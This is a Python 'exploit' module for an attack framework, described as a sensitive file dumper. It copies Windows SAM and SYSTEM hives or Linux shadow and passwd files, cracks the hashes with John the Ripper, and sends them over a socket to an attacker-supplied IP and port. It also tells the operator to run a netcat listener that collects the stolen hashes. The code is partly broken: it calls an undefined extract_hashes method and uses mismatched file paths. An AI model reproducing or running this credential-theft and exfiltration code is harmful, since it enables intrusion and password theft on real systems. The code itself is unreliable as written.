import os
import subprocess
import hashlib
import shutil
import socket
import sys,pyfiglet
from collections import OrderedDict

MODULE_TYPE = "exploit"
# Module class definition
class ModuleClass:
    def __init__(self):
        self.info = {
            'Name': 'Python Sensitive File Dumper ',
            'Rank':'Good',
            'Platform':'Windows/Linux',
            'architectures':'x86/64 bit processors',
            'Note':'Run the script as; root on linux and administartor on windows\n[**Attacker Machine**] Set up a listener to receive the data: \nbash nc -lvp 4444 > received_hashes.txt',
            'Description': 'dumps sensitive files (e.g., SAM files on Windows, shadow files on Linux),\nBrute-Forces Hashes,\nSends dumpedData to Attacker',
            'Author': 'pyLord@cyb3rH4ck3r',
            'Date Release': 'Tue/4/March/2025',
            'Options': OrderedDict([
                ('URL', ('Enter target URL (e.g., http://example.com/login)', False, 'HACKER ADDRESS')),
                ('RHOST', ('', True, 'HACKER IP')),
                ('WORDLIST', ('', True, 'wordListFile')),
                ('PORT', ('', True, 'HACKER PORT')),
                
                ])
                }
    def logo(self):
    	title = 'pyDumper'
    	if pyfiglet:
    	       ascii_text = pyfiglet.figlet_format(title, font="standard")
    	       print(f"\033[91m{ascii_text}\033[0m")
    	else:
            print(title)
    def help(self):
    	print("Usage: set IP <username> | set URL <http://127.0.0.1/hacker_address>  ,then run")
   
   
    
    
    def dump_windows_sam(self):
      """Dump Windows SAM files."""
      print("[*] Dumping Windows SAM files...")
      try:
        # Copy SAM and SYSTEM files
        shutil.copy2("C:\\Windows\\System32\\config\\SAM", ".\\SAM")
        shutil.copy2("C:\\Windows\\System32\\config\\SYSTEM", ".\\SYSTEM")
        print("[+] Windows SAM files dumped.")
      except Exception as e:
        print(f"[-] Failed to dump Windows SAM files: {e}")
    def dump_linux_shadow(self):
    	"""Dump Linux shadow files."""
    	print("[*] Dumping Linux shadow files...")
    	try:
    	   # Copy shadow and passwd files
    	   shutil.copy2("/etc/shadow", "./shadow")
    	   shutil.copy2("/etc/passwd", "./passwd")
    	   print("[+] Linux shadow files dumped.")
    	except Exception as e:
            print(f"[-] Failed to dump Linux shadow files: {e}")
    def brute_force_hashes(self,WORDLIST_PATH):
    	"""Brute-force extracted hashes using a wordlist."""
    	print("[*] Brute-forcing hashes...")
    	try:
    	       if os.path.exists("/sdcard/msf/hashes.txt"):
    	       	# Use John the Ripper to brute-force hashes
    	       	os.system(f"john --wordlist={WORDLIST_PATH} hashes.txt")
    	       	print("[+] Brute-forcing completed.")
    	       else:
    	       	print("[-] No hashes file found.")
    	except Exception as e:
    		print(f"[-] Failed to brute-force hashes: {e}")
    def send_data_to_attacker(self,REMOTE_IP, REMOTE_PORT,url=None):
    	"""Send captured data to the attacker's machine."""
    	print("[*] Sending data to attacker...")
    	try:
    	   # Create a socket connection
    	   with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    	       s.connect((REMOTE_IP, REMOTE_PORT))
    	       # Send hashes file
    	       with open("/sdcard/msf/hashes.txt", "rb") as f:
    	       	s.sendall(f.read())
    	       	print("[+] Data sent to attacker.")
    	except Exception as e:
    		print(f"[-] Failed to send data: {e}")
    def execute(self):
        url = self.info['Options']['URL'][0]
        REMOTE_IP = self.info['Options']['RHOST'][0]# Replace with attacker's IP
        WORDLIST_PATH = self.info['Options']['WORDLIST'][0]# Path to wordlist for brute-forcing
        REMOTE_PORT = self.info['Options']['PORT'][0]     # Replace with attacker's port
        self.logo()
        print("[*] Starting sensitive file dumper...")
        if os.name == "nt":
            self.dump_windows_sam()
        else:
            self.dump_linux_shadow()
        self.extract_hashes()
        self.brute_force_hashes(WORDLIST_PATH)
        self.send_data_to_attacker(REMOTE_IP, REMOTE_PORT,url=None)
        print("[*] Sensitive file dumper completed.")
      
        return "[+] Initializing / Getting things ready ..."
    